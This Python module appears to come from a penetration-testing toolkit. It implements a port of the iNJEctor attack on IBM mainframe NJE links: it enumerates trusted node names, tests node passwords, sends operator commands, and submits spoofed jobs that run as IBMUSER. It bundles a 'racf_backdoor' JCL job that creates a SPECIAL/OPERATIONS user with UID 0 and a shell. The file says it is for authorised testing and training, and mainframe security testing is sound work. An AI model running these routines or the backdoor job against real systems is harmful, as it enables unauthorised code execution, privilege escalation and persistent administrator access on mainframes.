"""NJE (Network Job Entry) security testing for PHOSPHOR - "iNJEctor".

NJE is how mainframes trust each other: nodes exchange jobs, files and operator
commands over TCP (port 175 clear, 2252 TLS).  The trust is by *node name*, and
classic NJE has no encryption and, often, no or a weak node password.  That makes it
a rich lateral-movement surface, which is what iNJEctor (Soldier of Fortran /
bigendiansmalls, DEF CON 23) demonstrated.

This is a clean-room client for the two highest-value, lowest-noise checks - it does
not need the GPL njelib or bitstring:

  * OPEN probe - send an OPEN control record claiming to be RHOST and targeting
    OHOST.  The 1-byte reason code in the reply tells you a lot without ever signing
    on:
        0x00  ACK  - OHOST exists AND RHOST is an authorised/trusted node  (!!)
        0x04  NAK  - OHOST exists but RHOST is not authorised   (confirms the node)
        0x01  NAK  - OHOST unknown                              (node not found)
    So you can enumerate valid node names and, more importantly, discover node names
    the target already *trusts* - the ones you would spoof to submit jobs.

  * sign-on password test - after an ACK, complete the SOH/ENQ -> DLE/ACK exchange
    and send the I-record carrying the node password.  A 'J' reply means the password
    was accepted (or none was required); a 'B' reply means it was rejected.  An empty
    password that returns 'J' is a no-password NJE node - a serious finding.

Both checks are read-only reconnaissance.  Job submission over an established, trusted
NJE session (the actual RCE / RACF-backdoor step, e.g. the bundled racf.jcl) is the
follow-on and is gated behind an explicit, separate call so it is never accidental.

Wire format and constants follow the standard NJE TCP handshake; they interoperate
with GIBSON's NJE service and with real JES2/JES3 NJE-over-TCP.  Authorised testing
and GIBSON training only.
"""
from __future__ import annotations

import socket
import struct
from dataclasses import dataclass, field
from typing import Dict, List, Optional

NJE_PORT = 175
NJE_TLS_PORT = 2252

R_OK = 0x00            # OHOST + RHOST both valid (full ACK)
R_UNKNOWN_OHOST = 0x01  # OHOST unknown
R_BAD_RHOST = 0x04     # OHOST valid, RHOST not authorised

SRCB_I = 0xC9          # 'I' initial sign-on (client -> server)
SRCB_J = 0xD1          # 'J' sign-on accepted
SRCB_B = 0xC2          # 'B' sign-on rejected (bad password) / close

# fixed control frames of the post-OPEN handshake
SOH_ENQ = bytes.fromhex("000000120000000000000002012d00000000")
_IREC_PW_OFFSET = 37   # 8-byte EBCDIC node password inside the I-record


def ebcdic8(text: str) -> bytes:
    return text.upper().encode("cp037")[:8].ljust(8, b"\x40")


def from_ebcdic(raw: bytes) -> str:
    try:
        return raw.decode("cp037").strip()
    except Exception:
        return ""


def build_open(rtype: str, *, rhost: str, ohost: str,
               rip: bytes = b"\x00\x00\x00\x00", oip: bytes = b"\x00\x00\x00\x00",
               r: int = 0) -> bytes:
    """The 33-byte OPEN/ACK/NAK control record."""
    return (ebcdic8(rtype) + ebcdic8(rhost) + rip[:4].ljust(4, b"\x00")
            + ebcdic8(ohost) + oip[:4].ljust(4, b"\x00") + struct.pack("B", r & 0xFF))


def parse_open(data: bytes) -> Optional[dict]:
    if not data or len(data) < 33:
        return None
    return {"type": from_ebcdic(data[0:8]), "rhost": from_ebcdic(data[8:16]),
            "ohost": from_ebcdic(data[20:28]), "r": data[32]}


def build_irecord(rhost: str, ohost: str, password: str) -> bytes:
    """Minimal I-record (NCCR / NCCILPAS) carrying the node password at offset 37."""
    rec = bytearray(62)
    rec[0:4] = b"\x00\x00\x00\x16"        # TTB
    rec[8:12] = b"\x00\x00\x00\x0e"       # TTR
    rec[12:14] = b"\x10\x02"              # DLE STX
    rec[14:17] = b"\x80\x8f\xcf"          # BCB FCS
    rec[17] = 0xF0                        # RCB
    rec[18] = SRCB_I                      # SRCB 'I'
    rec[19:27] = ebcdic8(ohost)           # NCCIDL (target node)
    rec[27:35] = ebcdic8(rhost)           # claimed origin node
    rec[_IREC_PW_OFFSET:_IREC_PW_OFFSET + 8] = ebcdic8(password)  # NCCILPAS
    return bytes(rec)


@dataclass
class NjeResult:
    host: str
    port: int
    rhost: str
    ohost: str
    opened: bool = False
    reason: Optional[int] = None          # R_OK / R_UNKNOWN_OHOST / R_BAD_RHOST
    signon_attempted: bool = False
    signon_ok: Optional[bool] = None
    password: str = ""
    error: Optional[str] = None
    findings: List[str] = field(default_factory=list)

    def reason_text(self) -> str:
        return {R_OK: "ACK - OHOST valid and RHOST trusted",
                R_BAD_RHOST: "NAK - OHOST exists, RHOST not authorised",
                R_UNKNOWN_OHOST: "NAK - OHOST unknown"}.get(self.reason,
                                                             f"reason 0x{(self.reason or 0):02x}")


def _recv(sock: socket.socket, n: int = 4096) -> bytes:
    try:
        return sock.recv(n)
    except socket.timeout:
        return b""


def open_probe(host: str, ohost: str, rhost: str = "FAKE",
               port: int = NJE_PORT, tls: bool = False,
               timeout: float = 8.0) -> NjeResult:
    """Send just the OPEN record and read the reply. Read-only node reconnaissance."""
    res = NjeResult(host, port, rhost.upper(), ohost.upper())
    try:
        sock = socket.create_connection((host, port), timeout)
        if tls:
            from phosphor.protocols import tls as _tls
            sock = _tls.wrap_socket(sock, host, verify=False)
        sock.settimeout(timeout)
        sock.sendall(build_open("OPEN", rhost=rhost, ohost=ohost))
        reply = _recv(sock)
        sock.close()
        parsed = parse_open(reply)
        if not parsed:
            res.error = "no / short OPEN reply"
            return res
        res.reason = parsed["r"]
        res.opened = parsed["r"] == R_OK
        if parsed["r"] == R_OK:
            res.findings.append(f"node {ohost} exists AND trusts node name {rhost} "
                                f"- spoofable for job submission")
        elif parsed["r"] == R_BAD_RHOST:
            res.findings.append(f"node {ohost} exists (RHOST {rhost} not trusted - "
                                f"try known/adjacent node names)")
    except Exception as e:
        res.error = str(e)
    return res


def signon_test(host: str, ohost: str, rhost: str, password: str = "",
                port: int = NJE_PORT, tls: bool = False,
                timeout: float = 8.0) -> NjeResult:
    """Full handshake up to the I-record: OPEN -> SOH/ENQ -> DLE/ACK -> I(password).
    Returns whether the node accepted the (possibly empty) password."""
    res = NjeResult(host, port, rhost.upper(), ohost.upper(), password=password)
    try:
        sock = socket.create_connection((host, port), timeout)
        if tls:
            from phosphor.protocols import tls as _tls
            sock = _tls.wrap_socket(sock, host, verify=False)
        sock.settimeout(timeout)
        sock.sendall(build_open("OPEN", rhost=rhost, ohost=ohost))
        parsed = parse_open(_recv(sock))
        if not parsed:
            res.error = "no OPEN reply"; sock.close(); return res
        res.reason = parsed["r"]; res.opened = parsed["r"] == R_OK
        if not res.opened:
            res.findings.append(res.reason_text())
            sock.close(); return res
        # OPEN accepted -> do the SOH/ENQ / DLE/ACK exchange, then send the I-record
        sock.sendall(SOH_ENQ)
        _recv(sock)                                  # DLE/ACK
        sock.sendall(build_irecord(rhost, ohost, password))
        reply = _recv(sock)
        sock.close()
        res.signon_attempted = True
        srcb = reply[18] if len(reply) > 18 else None
        res.signon_ok = (srcb == SRCB_J)
        if res.signon_ok and not password:
            res.findings.append(f"node {ohost} accepted sign-on with NO password "
                                f"- unauthenticated NJE trust")
        elif res.signon_ok:
            res.findings.append(f"node {ohost} accepted node password '{password}'")
        else:
            res.findings.append(f"node {ohost} rejected password '{password or '(empty)'}'")
    except Exception as e:
        res.error = str(e)
    return res


def enumerate_nodes(host: str, candidates: List[str], rhost: str = "FAKE",
                    port: int = NJE_PORT, tls: bool = False,
                    timeout: float = 6.0) -> List[NjeResult]:
    """OPEN-probe a list of candidate node names; report which exist / are trusted."""
    out = []
    for name in candidates:
        r = open_probe(host, name.strip(), rhost=rhost, port=port, tls=tls, timeout=timeout)
        if r.reason in (R_OK, R_BAD_RHOST) or r.error is None:
            out.append(r)
    return out


# node names worth trying when you have no config to read
COMMON_NODES = ["POK", "MVS", "MVSA", "SYSA", "SYSB", "NODE1", "NODEA", "PROD",
                "TEST", "DEV", "JES2", "RSCS", "VMSYS", "CENTRAL", "MAINCPU",
                "NEWYORK", "WASHDC", "HAL", "ORAC", "GIBSON"]


def bundled_jcl() -> Dict[str, str]:
    """Attack JCL you would submit over an established, trusted NJE session (the
    /*XEQ node step runs it on the *target*). Never sent automatically."""
    return {
        "id": ("//IDJOB    JOB (1),'ID',CLASS=A,MSGCLASS=X\n"
               "//RUN  EXEC PGM=IKJEFT01\n//SYSTSPRT DD SYSOUT=*\n"
               "//SYSTSIN  DD *\n  PROFILE\n  WHOAMI\n/*\n"),
        "racf_backdoor": ("//PWNJOB   JOB (1),'X',CLASS=A,MSGCLASS=X\n"
                          "//RUN  EXEC PGM=IKJEFT01\n//SYSTSPRT DD SYSOUT=*\n"
                          "//SYSTSIN  DD *\n"
                          "  ADDUSER  ATKR PASSWORD(N3WPASS) SPECIAL OPERATIONS\n"
                          "  ALU ATKR OMVS(UID(0) HOME(/) PROGRAM(/bin/sh))\n/*\n"),
    }


# ============================================================================
#  NMR - operator commands over an established NJE session ("$D NODE", etc.)
# ============================================================================
# After sign-on you can send Nodal Message Records: operator commands that run on
# the target node and stream their reply back (JES2 $ commands, e.g. $D NODE to map
# the network, $D NJEDEF, $D JOBQ).  This is iNJEctor's headline capability.
#
# The record framing (SCB string-control-byte compression, TTB/TTR, DLE/STX, BCB
# sequence, FCS) matches Soldier of Fortran's njelib byte-for-byte; the NMR payload
# and reply parsing follow the NJE reference (NMR / SCB, IBM HASA600).

RCB_NMR = 0x9A


def make_scb(buf: bytes):
    """SCB (String Control Byte) compression - a byte-exact port of njelib.makeSCB.
    Returns (compressed_bytes_with_trailing_00, remaining_len)."""
    sp = b"\x40"                       # EBCDIC space
    processed = 0
    c = 0
    d = b""
    t = b""
    while len(buf) > 0 and processed < 253:
        if buf[0:1] == sp and buf[1:2] == sp:
            if c > 0:
                d += bytes([0xC0 + c]) + t
            t = b""
            c = 1
            while c < len(buf) and buf[c:c + 1] == sp and (processed + c < 253):
                if c == 31:
                    break
                c += 1
            d += bytes([0x80 + c])
            buf = buf[c - 1:]
            processed += c
            c = 0
        elif len(buf) > 2 and buf[0:1] == buf[2:3] and buf[0:1] == buf[1:2]:
            if c > 0:
                d += bytes([0xC0 + c]) + t
            t = b""
            c = 2
            while c < len(buf) and buf[c:c + 1] == buf[0:1] and (processed + c < 253):
                if c == 31:
                    break
                c += 1
            d += bytes([0xA0 + c]) + buf[0:1]
            buf = buf[c - 1:]
            processed += c
            c = 0
        elif c == 63:
            d += bytes([0xC0 + c]) + t
            t = b""
            processed += c
            c = 0
        else:
            t += buf[0:1]
            c += 1
            processed += 1
        buf = buf[1:]
    if c > 0:
        d += bytes([0xC0 + c]) + t
    return d + b"\x00", len(buf)


def make_ttb(data: bytes) -> bytes:
    return b"\x00\x00" + struct.pack(">H", len(data) + 12) + b"\x00\x00\x00\x00" + data + b"\x00\x00\x00\x00"


def calc_ttr(data: bytes) -> bytes:
    return b"\x00\x00" + struct.pack(">H", len(data))


def scb_decompress(data: bytes):
    """Inverse of make_scb - decode SCB-compressed data (for parsing host replies).
    Returns (plaintext, bytes_consumed_including_terminator)."""
    out = bytearray()
    i = 0
    while i < len(data):
        scb = data[i]; i += 1
        if scb == 0x00:
            break
        if scb & 0xC0 == 0xC0:                     # literal run
            n = scb & 0x3F
            out += data[i:i + n]; i += n
        elif scb & 0xE0 == 0xA0:                   # repeated char
            if i >= len(data):
                break
            out += bytes([data[i]]) * (scb & 0x1F); i += 1
        elif scb & 0xE0 == 0x80:                   # run of spaces
            out += b"\x40" * (scb & 0x1F)
        else:
            break
    return bytes(out), i


def build_nmr(rhost: str, ohost: str, command: str, *,
              fcs: bytes = b"\x8f\xcf", sequence: int = 0x80,
              target_node: bytes = b"\x02", own_node: bytes = b"\x01") -> bytes:
    """Build the full on-the-wire NMR command record (TTB/TTR framed, SCB compressed)."""
    msg = command.encode("cp037")
    nmr = (b"\x90"                     # NMRFLAG - contains a command
           + b"\x77"                   # NMRLEVEL - essential
           + b"\x00"                   # NMRTYPE - unformatted command
           + bytes([len(msg) & 0xFF])  # NMRML
           + ebcdic8(ohost) + target_node          # NMRTO
           + b"\x00" * 8                            # NMROUT
           + ebcdic8(rhost) + own_node              # NMRFM
           + msg)                                   # NMRMSG
    comp, _ = make_scb(nmr)
    nje_record = bytes([RCB_NMR, 0x00]) + comp
    ds = b"\x10\x02"
    bcb = bytes([sequence & 0xFF])
    inner = ds + bcb + fcs + nje_record
    records = calc_ttr(inner) + inner
    return make_ttb(records)


def next_sequence(seq: int) -> int:
    return (seq & 0x0F) + 1 | 0x80


def send_command(host: str, ohost: str, rhost: str, command: str, password: str = "",
                 port: int = NJE_PORT, tls: bool = False, timeout: float = 8.0,
                 fcs: bytes = b"\x8f\xcf") -> NjeResult:
    """Sign on to OHOST as RHOST, then send an operator command (NMR) and collect the
    reply. NOTE: the reply round-trip needs a live JES2 NJE node; GIBSON's simulator
    stops after sign-on, so against GIBSON this confirms send + sign-on only."""
    res = signon_test(host, ohost, rhost, password, port=port, tls=tls, timeout=timeout)
    if not res.signon_ok:
        res.findings.append("cannot send command: sign-on not accepted")
        return res
    try:
        sock = socket.create_connection((host, port), timeout)
        if tls:
            from phosphor.protocols import tls as _tls
            sock = _tls.wrap_socket(sock, host, verify=False)
        sock.settimeout(timeout)
        # re-open + sign on this session, then send the NMR
        sock.sendall(build_open("OPEN", rhost=rhost, ohost=ohost)); _recv(sock)
        sock.sendall(SOH_ENQ); _recv(sock)
        sock.sendall(build_irecord(rhost, ohost, password)); _recv(sock)
        sock.sendall(build_nmr(rhost, ohost, command, fcs=fcs))
        reply = _recv(sock)
        sock.close()
        res.findings.append(f"sent NMR command '{command}' ({len(build_nmr(rhost, ohost, command))} bytes)")
        if reply:
            text = reply.decode("cp037", errors="replace")
            printable = "".join(ch for ch in text if ch.isprintable() or ch in " \n")
            if printable.strip():
                res.findings.append("reply: " + printable.strip()[:200])
        else:
            res.findings.append("no reply (host may not process NMR, or needs the "
                                "negotiated FCS - confirm against a live JES2 node)")
    except Exception as e:
        res.error = str(e)
    return res


# ============================================================================
#  Job submission  (/*XEQ) - the lateral-movement / RCE step
# ============================================================================
# Over a trusted NJE session you can submit a job that runs on the *target* node.
# The NJE Job Header (NJH) carries NJHTOUSR / NJHTOGRP - the userid and group the job
# runs under - so a trusted node can submit a job that executes as IBMUSER, or any
# SPECIAL user, on the target (the classic NJE privilege-escalation / RACF-backdoor).
#
# The record build path (NJH + SYSIN records + trailer, SCB compressed, TTB/TTR framed)
# is a faithful port of Soldier of Fortran's njelib and is validated byte-for-byte
# against it.  Authorised testing / GIBSON training only.

import re as _re

_SPACE = b"\x40"
RCB_SYSIN = 0x98


def _ebj(s: str) -> bytes:
    """EBCDIC as njelib does it (cp500 / EBCDIC-CP-BE), no case change."""
    return s.encode("cp500")


def _pad8j(word: str) -> bytes:
    return _ebj(word.upper()) + _SPACE * (8 - len(word))


def build_njh(job_name: str, jobnum: int, programmer: str, job_class: str,
              msg_class: str, acc: str, userid: str, group: str, rhost: str,
              ohost: str, lines: int, target_node: bytes = b"\x02") -> bytes:
    """Build the NJE Job Header. userid/group become NJHTOUSR/NJHTOGRP - the identity
    the job runs under on the target."""
    R = _pad8j(rhost)
    O = _pad8j(ohost)
    NJHTOUSR = _pad8j(userid)
    NJHTOGRP = _pad8j(group)

    nje_header = (
        b"\x00\xD4" + b"\x00" + b"\x00"
        + struct.pack(">h", jobnum)
        + _ebj(job_class) + _ebj(msg_class)
        + b"\x40" + b"\x09" + target_node + b"\x01" + b"\x00" + b"\x00" + b"\x00\x00"
        + b"\x00" * 8
        + _pad8j(job_name) + _pad8j(userid)
        + b"\x00" * 8 + b"\x00" * 8
        + b"\xd0$\xfe\x11\xe1\xea\x10\x00"
        + R + _pad8j(userid) + O + (b"\x40" * 8)
        + R + R + R + (b"\x40" * 8)
        + _pad8j("STD")
        + struct.pack(">i", lines)
        + b"\x00\x00\x00\x78" + b"\x00\x00\x2E\xE0" + b"\x00\x00\x00\x64"
        + (_ebj(programmer) + _SPACE * (20 - len(programmer)))
        + (b"\x40" * 8) + (b"\x40" * 8) + (b"\x40" * 8)
        + (b"\x00" * 4) + struct.pack(">i", jobnum) + R
    )
    jes2_header = b"\x00\x34" + b"\x84" + (b"\x00" * 49)
    sched_header = b"\x00\x0C" + b"\x8A" + b"\x00" + b"\x00\x00\x00\x28" + b"\x05\xF5\xDD\x18"
    acc_header = (b"\x8D" + b"\x00" + b"\x00\x00" + b"\x00" + b"\x08"
                  + struct.pack(">h", len(acc) + 2) + b"\x01" + bytes([len(acc)]) + _ebj(acc))
    acc_header = struct.pack(">h", len(acc_header) + 2) + acc_header
    sec_prefix = b"\x00\x58" + b"\x8C" + b"\x00" + b"\x00\x04" + b"\x00" + b"\x00"
    sec_subsec = b"\x50" + b"\x01" + b"\x32" + b"\x07" + b"\x00"
    sec_subsec += (b"\x03" + b"\xC0\x00" + (b"\x00" * 8) + R + (b"\x00" * 24)
                   + _pad8j("INTRDR") + (b"\x00" * 8))
    sec_subsec += NJHTOUSR + NJHTOGRP
    sec_header = sec_prefix + sec_subsec

    job_prefix = b"\x00\xFD\x00\x80"
    header = job_prefix + nje_header + jes2_header + sched_header + acc_header + sec_header
    part1 = header[:253]
    part2 = struct.pack(">h", len(header[253:]) + 4) + b"\x00\x01" + header[253:]
    return part1 + part2


def sysin_footer() -> bytes:
    return b"\x00\x34\x00\x00" + b"\x00\x30" + (b"\x00" * 46)


def build_sysin_stream(records, fcs: bytes = b"\x8f\xcf", sequence: int = 0x80) -> bytes:
    """Frame a list of {'RCB','SRCB','Data'} SYSIN records into one TTB-wrapped,
    SCB-compressed NJE transmission (port of njelib.sendNJE_multiple)."""
    nje_record = b""
    for rec in records:
        nje_record += bytes([rec["RCB"], rec["SRCB"]])
        comp, rem = make_scb(rec["Data"])
        nje_record += comp
        data = rec["Data"]
        while rem > 0:
            data = data[-rem:]
            comp, rem = make_scb(data)
            nje_record += bytes([rec["RCB"], rec["SRCB"]]) + comp
    nje_record += b"\x00"                     # EOR
    ds = b"\x10\x02"
    bcb = bytes([sequence & 0xFF])
    inner = ds + bcb + fcs + nje_record
    return make_ttb(calc_ttr(inner) + inner)


def build_job(rhost: str, ohost: str, jcl_text: str, userid: str = "IBMUSER",
              group: str = "SYS1", job_class: str = "A", msg_class: str = "K",
              fcs: bytes = b"\x8f\xcf", sequence: int = 0x80,
              target_node: bytes = b"\x02"):
    """Turn JCL text into the full SYSIN wire stream to submit it as `userid`.
    Returns (wire_bytes, info)."""
    data = [l for l in jcl_text.splitlines()]
    if not data:
        raise ValueError("empty JCL")
    header = data[0].strip()
    i = 1
    while i < len(data) and len(data[i]) > 2 and data[i][2] == " ":
        header += data[i][3:].strip()
        i += 1
    job = header.strip()[2:10]
    acc = header[header.find("(") + 1:header.find(")")] if "(" in header else "1"
    m = _re.findall(r"(?<=')[^']+(?=')", header)
    prog = m[0] if m else "PHOSPHOR"

    jcl = [data[0] + " " * (72 - len(data[0])) + "JOB00049"] + data[1:]
    jobnum = int(jcl[0][-5:])
    njh = build_njh(job, jobnum, prog, job_class, msg_class, acc, userid, group,
                    rhost, ohost, len(jcl), target_node)
    records = [{"RCB": RCB_SYSIN, "SRCB": 0xC0, "Data": njh}]
    for line in jcl:
        records.append({"RCB": RCB_SYSIN, "SRCB": 0x80, "Data": b"\x50" + _ebj(line)})
    records.append({"RCB": RCB_SYSIN, "SRCB": 0xD0, "Data": sysin_footer()})
    wire = build_sysin_stream(records, fcs=fcs, sequence=sequence)
    info = {"job_name": job, "acct": acc, "programmer": prog, "run_as": userid,
            "group": group, "lines": len(jcl), "bytes": len(wire)}
    return wire, info


def submit_job(host: str, ohost: str, rhost: str, jcl_text: str, password: str = "",
               userid: str = "IBMUSER", group: str = "SYS1", port: int = NJE_PORT,
               tls: bool = False, timeout: float = 8.0,
               fcs: bytes = b"\x8f\xcf") -> NjeResult:
    """Sign on to OHOST as RHOST, then submit a job that runs on the target as `userid`,
    all on one connection.  NOTE: the execution/SYSOUT round-trip needs a live JES2 node
    (or the updated GIBSON NJE service).  The transmitted job stream is validated
    byte-for-byte against njelib."""
    res = NjeResult(host, port, rhost.upper(), ohost.upper(), password=password)
    try:
        wire, info = build_job(rhost, ohost, jcl_text, userid=userid, group=group, fcs=fcs)
        sock = socket.create_connection((host, port), timeout)
        if tls:
            from phosphor.protocols import tls as _tls
            sock = _tls.wrap_socket(sock, host, verify=False)
        sock.settimeout(timeout)
        sock.sendall(build_open("OPEN", rhost=rhost, ohost=ohost))
        parsed = parse_open(_recv(sock))
        if not parsed:
            res.error = "no OPEN reply"; sock.close(); return res
        res.reason = parsed["r"]; res.opened = parsed["r"] == R_OK
        if not res.opened:
            res.findings.append(res.reason_text() + " - cannot submit")
            sock.close(); return res
        sock.sendall(SOH_ENQ); _recv(sock)
        sock.sendall(build_irecord(rhost, ohost, password))
        reply = _recv(sock)
        res.signon_attempted = True
        res.signon_ok = (len(reply) > 18 and reply[18] == SRCB_J)
        if not res.signon_ok:
            res.findings.append(f"sign-on rejected (password '{password or '(empty)'}') - cannot submit")
            sock.close(); return res
        if not password:
            res.findings.append(f"node {ohost} accepted sign-on with NO password")
        sock.sendall(wire)
        jobreply = _recv(sock)
        sock.close()
        res.findings.append(f"submitted job {info['job_name'].strip()} to run as "
                            f"{userid}/{group} ({info['bytes']} bytes on the wire)")
        if jobreply:
            txt = "".join(ch for ch in jobreply.decode("cp037", errors="replace")
                          if ch.isprintable() or ch in " \n")
            if txt.strip():
                res.findings.append("host: " + txt.strip()[:200])
        else:
            res.findings.append("no SYSOUT (needs a live JES2 node / updated GIBSON NJE "
                                "service to execute and return output)")
    except Exception as e:
        res.error = str(e)
    return res
